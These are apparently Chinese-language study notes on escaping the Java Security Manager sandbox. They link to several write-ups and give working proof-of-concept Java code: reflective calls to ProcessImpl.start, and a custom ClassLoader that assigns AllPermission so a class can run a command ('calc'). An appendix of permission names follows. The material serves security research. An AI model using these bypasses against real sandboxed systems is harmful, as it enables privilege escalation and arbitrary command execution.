# bypass-sm

https://www.anquanke.com/post/id/151398

https://www.mi1k7ea.com/2020/05/03/%E6%B5%85%E6%9E%90Java%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/

https://github.com/codeplutos/java-security-manager-bypass/



## **单等号+home目录可写导致Java Security Manager绕过**

>简单的说就是java程序启动的时候使用 -Djava.security.policy=java.policy 并且home目录可以写，我们就重新写一个policy 文件去提升我们的权限

## **通过setSecurityManager绕过Java Security Manager**

>就是通过反射去修改值达到绕过的目标。

其中的该反射可以成功，原因：

从代码中我们看到，正如前面所说，完成功能的是ProcessImpl.start方法，而在这个方法调用之前，security manager就已经完成了检测，于是，反射这个方法，调用它，就可以绕过检测。

[java 命令执行底层](https://blog.csdn.net/qsort_/article/details/104821283)

```java
   public static void executeCommandWithReflection(String command){
        try {
            Class clz = Class.forName("java.lang.ProcessImpl");
            Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);
            method.setAccessible(true);
            method.invoke(clz,new String[]{command},null,null,null,false);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
```

## **创建类加载器绕过java security manager**

>自定义一个ClassLoader来加载一个恶意类，并且把它的ProtectionDomain里面的权限初始化成所有权限，这样就能绕过Java Security Manager了

[自定义ClassLoader绕过poc为什么很多人执行出现问题的缘由](https://github.com/codeplutos/java-security-manager-bypass/issues/2)

Exploit.java

```java
import java.security.AccessController;
import java.security.PrivilegedAction;

public class Exploit {
    public Exploit() {

    }

    static {
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                try {
                    Process process = Runtime.getRuntime().exec("calc");
                    return null;
                } catch (Exception var2) {
                    var2.printStackTrace();
                    return null;
                }
            }
        });
    }
}
```

MyClassLoader.java

```java
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.nio.ByteBuffer;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.channels.WritableByteChannel;
import java.security.*;
import java.security.cert.Certificate;

public class MyClassLoader extends ClassLoader {
    public MyClassLoader() {
    }

    public MyClassLoader(ClassLoader parent) {
        super(parent);
    }

    @Override
    protected Class<?> findClass(String name) throws ClassNotFoundException {
        File file = getClassFile(name);
        try {
            byte[] bytes = getClassBytes(file);
            //在这里调用defineClazz，而不是super.defineClass
            Class<?> c = defineClazz(name, bytes, 0, bytes.length);
            return c;
        } catch (Exception e) {
            e.printStackTrace();
        }

        return super.findClass(name);
    }
    
    @Override
    public Class<?> loadClass(String name) throws ClassNotFoundException {
        if (name.contains("Exploit")) {
            return findClass(name);
        }
        return super.loadClass(name);
    }
    
    protected final Class<?> defineClazz(String name, byte[] b, int off, int len) throws ClassFormatError {
        try {
            PermissionCollection pc = new Permissions();
            pc.add(new AllPermission());

            //设置ProtectionDomain
            ProtectionDomain pd = new ProtectionDomain(new CodeSource(null, (Certificate[]) null),
                    pc, this, null);
            return this.defineClass(name, b, off, len, pd);
        } catch (Exception e) {
            return null;
        }
    }

    private File getClassFile(String name) {
        File file = new File("./" + name + ".class");
        return file;
    }

    private byte[] getClassBytes(File file) throws Exception {
        FileInputStream fis = new FileInputStream(file);
        FileChannel fc = fis.getChannel();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        WritableByteChannel wbc = Channels.newChannel(baos);
        ByteBuffer by = ByteBuffer.allocate(1024);

        while (true) {
            int i = fc.read(by);
            if (i == 0 || i == -1) {
                break;
            }

            by.flip();
            wbc.write(by);
            by.clear();
        }
        fis.close();
        return baos.toByteArray();
    }
}
```

BypassSandbox .java

```java
public class BypassSandbox {
    public static void main(String[] args) throws Exception {
        MyClassLoader mcl = new MyClassLoader();
        Class<?> c1 = Class.forName("Exploit", true, mcl);
        Object obj = c1.newInstance();
        System.out.println(obj.getClass().getClassLoader());
   }
}
```

## **本地方法调用绕过Java Security Manager**

>Java Security Manager是在java核心库中的一个功能，而java中native方法是由jvm执行的，不受java security manager管控。因此，我们可以调用java native方法，绕过java security manager。

## 附录

##### A

| 权限名                | 用途说明                                                     |
| :-------------------- | :----------------------------------------------------------- |
| accessClassInPackage. | 允许代码访问指定包中的类                                     |
| accessDeclaredMembers | 允许代码使用反射访问其他类中私有或保护的成员                 |
| createClassLoader     | 允许代码实例化类加载器                                       |
| createSecurityManager | 允许代码实例化安全管理器，它将允许程序化的实现对沙箱的控制   |
| defineClassInPackage. | 允许代码在指定包中定义类                                     |
| exitVM                | 允许代码关闭整个虚拟机                                       |
| getClassLoader        | 允许代码访问类加载器以获得某个特定的类                       |
| getProtectionDomain   | 允许代码访问保护域对象以获得某个特定类                       |
| loadlibrary.          | 允许代码装载指定类库                                         |
| modifyThread          | 允许代码调整指定的线程参数                                   |
| modifyThreadGroup     | 允许代码调整指定的线程组参数                                 |
| queuePrintJob         | 允许代码初始化一个打印任务                                   |
| readFileDescriptor    | 允许代码读文件描述符（相应的文件是由其他保护域中的代码打开的） |
| setContextClassLoader | 允许代码为某线程设置上下文类加载器                           |
| setFactory            | 允许代码创建套接字工厂                                       |
| setIO                 | 允许代码重定向System.in、System.out或System.err输入输出流    |
| setSecurityManager    | 允许代码设置安全管理器                                       |
| stopThread            | 允许代码调用线程类的stop()方法                               |
| writeFileDescriptor   | 允许代码写文件描述符                                         |

##### B

| 权限名                         | 用途说明                      |
| :----------------------------- | :---------------------------- |
| accessClipboard                | 允许访问系统的全局剪贴板      |
| accessEventQueue               | 允许直接访问事件队列          |
| createRobot                    | 允许代码创建AWT的Robot类      |
| listenToAllAWTEvents           | 允许代码直接监听事件分发      |
| readDisplayPixels              | 允许AWT Robot读显示屏上的像素 |
| showWindowWithoutWarningBanner | 允许创建无标题栏的窗口        |

##### C

| 权限名                        | 用途说明                      |
| :---------------------------- | :---------------------------- |
| specifyStreamHandler          | 允许在URL类中安装新的流处理器 |
| setDefaultAuthenticator       | 可以安装鉴别类                |
| requestPassworkAuthentication | 可以完成鉴别                  |

##### D

| 权限名                     | 用途说明                                 |
| :------------------------- | :--------------------------------------- |
| addIdentityCertificate     | 为Identity增加一个证书                   |
| clearProviderProperties.   | 针对指定的提供者，删除所有属性           |
| createAccessControlContext | 允许创建一个存取控制器的上下文环境       |
| getDomainCombiner          | 允许撤销保护域                           |
| getPolicy                  | 检索可以实现沙箱策略的类                 |
| getProperty.               | 读取指定的安全属性                       |
| getSignerPrivateKey        | 由Signer对象获取私有密钥                 |
| insertProvider.            | 将指定的提供者添加到响应的安全提供者组中 |
| loadProviderProperties.    | 装载指定的提供者的属性                   |
| printIdentity              | 打印Identity类内容                       |
| putAllProviderProperties.  | 更新指定的提供者的属性                   |
| putProviderProperty.       | 为指定的提供者增加一个属性               |
| removeIdentityCertificate  | 取消Identity对象的证书                   |
| removeProvider.            | 将指定的提供者从相应的安全提供者组中删除 |
| removeProviderProperty.    | 删除指定的安全提供者的某个属性           |
| setIdentityInfo            | 为某个Identity对象设置信息串             |
| setIdentityPublicKey       | 为某个Identity对象设置公钥               |
| setPolicy                  | 设置可以实现沙箱策略的类                 |
| setProperty.               | 设置指定的安全属性                       |
| setSignerKeyPair           | 在Signer对象中设置密钥对                 |
| setSystemScope             | 设置系统所用的IdentityScope              |

##### E

| 权限名                       | 用途说明                                                     |
| :--------------------------- | :----------------------------------------------------------- |
| enableSubstitution           | 允许实现ObjectInputStream类的enableResolveObject()方法和ObjectOutputStream类的enableReplaceObject()方法 |
| enableSubclassImplementation | 允许ObjectInputStream和ObjectOutputStream创建子类，子类可以覆盖readObject()和writeObject()方法 |
